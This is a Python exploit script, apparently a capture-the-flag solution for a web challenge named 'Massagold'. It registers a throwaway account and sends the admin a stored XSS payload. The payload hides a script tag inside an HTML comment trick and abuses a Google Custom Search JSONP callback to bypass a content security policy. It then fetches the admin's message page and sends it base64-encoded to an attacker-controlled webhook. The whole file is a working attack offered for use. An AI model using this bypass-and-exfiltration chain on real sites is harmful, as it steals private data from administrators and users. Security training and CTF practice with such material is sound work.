#!/usr/bin/env python3
import argparse
import random
import string
from urllib.parse import quote

import requests


def random_value(prefix):
    suffix = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return f'{prefix}_{suffix}'


def build_payload(webhook):
    webhook = webhook.rstrip('?')
    callback = (
        f'fetch(`/messages/1`)'
        '.then(function f1(r){return r.text()})'
        f'.then(function f2(txt){{location.href=`{webhook}?`+btoa(txt)}});'
    )

    src = (
        'https://www.googleapis.com/customsearch/v1'
        f'?callback={quote(callback, safe="")}'
    )



    return f'<!--><script src="{src}"></script>-->'


def main():
    parser = argparse.ArgumentParser(description='Send the Massagold payload to admin.')
    parser.add_argument('target', help='Target base URL, for example http://127.0.0.1:1337')
    parser.add_argument('webhook', help='Webhook URL that receives the base64 encoded message page')
    args = parser.parse_args()

    target = args.target.rstrip('/')
    username = random_value('user')
    password = random_value('pass')
    payload = build_payload(args.webhook)

    session = requests.Session()

    register = session.post(
        f'{target}/register',
        data={
            'username': username,
            'password': password,
        },
        allow_redirects=False,
        timeout=10,
    )
    register.raise_for_status()

    message = session.post(
        f'{target}/messages',
        data={
            'to_username': 'admin',
            'content': payload,
        },
        allow_redirects=False,
        timeout=10,
    )
    message.raise_for_status()

    print(f'[+] Registered as {username}')
    print('[+] Payload sent to admin')
    print('[+] Check the webhook for the base64 encoded response')


if __name__ == '__main__':
    main()
